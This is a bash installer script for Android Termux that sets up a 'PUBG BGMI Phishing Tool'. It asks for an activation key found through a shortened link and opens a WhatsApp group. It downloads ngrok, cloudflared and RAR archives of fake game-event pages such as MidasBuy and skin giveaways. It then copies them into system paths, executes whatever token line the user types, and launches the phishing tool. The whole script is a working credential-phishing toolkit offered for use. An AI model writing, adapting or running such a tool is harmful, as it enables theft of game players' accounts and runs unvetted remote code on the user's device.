#!/bin/bash
echo ""
clear
echo ""

logo() {
echo -e ""
echo -e "\e[33m

 ██▓███   █    ██  ▄▄▄▄     ▄████ 
▓██░  ██▒ ██  ▓██▒▓█████▄  ██▒ ▀█▒
▓██░ ██▓▒▓██  ▒██░▒██▒ ▄██▒██░▄▄▄░
▒██▄█▓▒ ▒▓▓█  ░██░▒██░█▀  ░▓█  ██▓
▒██▒ ░  ░▒▒█████▓ ░▓█  ▀█▓░▒▓███▀▒
▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░▒▓███▀▒ ░▒   ▒ 
░▒ ░     ░░▒░ ░ ░ ▒░▒   ░   ░   ░ 
░░        ░░░ ░ ░  ░    ░ ░ ░   ░ 
            ░      ░            ░ 
                        ░         
         ▄▄▄▄     ▄████  ███▄ ▄███▓ ██▓   
        ▓█████▄  ██▒ ▀█▒▓██▒▀█▀ ██▒▓██▒   
        ▒██▒ ▄██▒██░▄▄▄░▓██    ▓██░▒██▒   
        ▒██░█▀  ░▓█  ██▓▒██    ▒██ ░██░   
        ░▓█  ▀█▓░▒▓███▀▒▒██▒   ░██▒░██░   
        ░▒▓███▀▒ ░▒   ▒ ░ ▒░   ░  ░░▓     
        ▒░▒   ░   ░   ░ ░  ░      ░ ▒ ░   
         ░    ░ ░ ░   ░ ░      ░    ▒ ░   
         ░            ░        ░    ░     
              ░                           
  \e[0m\n"
}

logo2() {
echo -e ""
echo -e "\e[92m 
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
  echo""
  
  }
  



echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!          Follow Step by Step         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo ""
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install Working \e[0m"
echo ""
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Link Services  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Phishing Page File  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
sleep 5
clear
echo ""
echo ""
echo -e "\e[1m \e[36m[+] There PUBG BGMI Phishing Tool Script for Android \e[m \e[21"
echo ""
echo ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!       WELCOME TO DARKSEC HACKING TOOL  !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo ""
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to continue : \e[0m' option
echo""
echo""
echo ""
termux-open-url https://chat.whatsapp.com/EvPB1EwiWxRDVmOPLXEs5V
echo ""
clear
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The PUBG BGMI Phishing Tool Please Wait....  \e[0m"
echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!             KEY REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e ""
echo -e "\e[33m
      ██╗  ██╗███████╗██╗   ██╗
      ██║ ██╔╝██╔════╝╚██╗ ██╔╝
      █████╔╝ █████╗   ╚████╔╝
      ██╔═██╗ ██╔══╝    ╚██╔╝
      ██║  ██╗███████╗   ██║
      ╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Visit This Shot Link and Copy Activation Key \e[0m"
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://tinyurl.com/PUBG-BGMI-Key  "
echo ""
echo ""
read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Activation Key : \e[0m' option
echo""
echo""
echo""
if [[ $option == *'Wearehackerifyouenterwrongkeysoyoudatawillbedeleteallyouhavejust3attempt'* ]]; then
clear
echo ""
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The PUBG BGMI Phishing Tool Please Wait....  \e[0m"
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m DARKSEC HACKING \e[0m"
echo ""
termux-setup-storage
apt install apache2 -y 
apt install ruby -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
apt install zip -y
apt install unrar -y
pkg install wget -y
pkg install ruby -y
pkg install gem -y
gem install lolcat
clear
echo""
logo2
echo""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;93m  !!         Download Link Services         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
echo ""
wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared-linux-arm64
echo""
clear
echo ""
logo
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;96m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-PUBG.rar -O SUMAN-PUBG.rar
echo ""
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-BGMI.rar -O SUMAN-BGMI.rar
unrar x -Password SUMAN-PUBG.rar
unrar x -Password SUMAN-BGMI.rar
rm -rf SUMAN-PUBG.rar SUMAN-BGMI.rar
chmod +x ngrok
chmod +x cloudflared-linux-arm64
chmod +x PUBG
chmod +x BGMI
clear

echo ""
echo -e "\e[93m 
 ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
 ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
         ░       ░    ░         ░ ░  ░  ░   
\e[0m\n"
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'y'* ]]; then
clear
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
echo ""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
echo ""
read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
echo ""
fi
if [[ $option == *'n'* ]]; then
clear
fi

echo
cp -R cloudflared-linux-arm64 ngrok .SUMAN/X-Suit/
cp -R cloudflared-linux-arm64 ngrok .SUMAN/Avalanche-X-Suit-LuckySpin/
cp -R cloudflared-linux-arm64 ngrok .SUMAN/MidasBuy/
cp -R cloudflared-linux-arm64 ngrok .SUMAN/SPIN-EVENT/
cp -R cloudflared-linux-arm64 ngrok .SUMAN/RP-Month-6-event/
cp -R cloudflared-linux-arm64 ngrok .SUMAN/BGMI_4_Anniversarry/
cp -R cloudflared-linux-arm64 ngrok .SUMAN/PUBG-4-Anniversarry/
cp -R cloudflared-linux-arm64 ngrok .SUMAN/PUBG-RP-M9/
cp -R cloudflared-linux-arm64 ngrok .SUMAN/BGMI-Collect-M416/
cp -R cloudflared-linux-arm64 ngrok .SUMAN/BGMI-Car-Event/
chmod 7777 PUBG-BGMI_Phishing
clear
echo
echo
cp -R ngrok /data/data/com.termux/files/usr/bin
cp -R cloudflared-linux-arm64 /data/data/com.termux/files/usr/bin
cp -R .SUMAN /data/data/com.termux/files/usr/bin
cp -R PUBG /data/data/com.termux/files/usr/bin
cp -R BGMI /data/data/com.termux/files/usr/bin
cp -R PUBG-BGMI_Phishing /data/data/com.termux/files/usr/bin
cp -R OnlineHacking /data/data/com.termux/files/usr/bin
cp -R start-link /data/data/com.termux/files/usr/bin
echo
echo
logo
echo
echo -e "\e[35m[+] Connect DARKSEC Hacking  Server (DARKSEC)......  \e[m "
sleep 5
echo
echo
clear
logo2
echo
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
sleep 4
echo
echo -e "\e[1m \e[36m[+] There PUBG BGMI Phishing Tool Ready \e[m \e[21"
echo
echo
echo -e "\e[92m[+] New type this command to start :\e[93m PUBG-BGMI_Phishing \e[m "
echo
fi
sleep 3
echo
bash PUBG-BGMI_Phishing
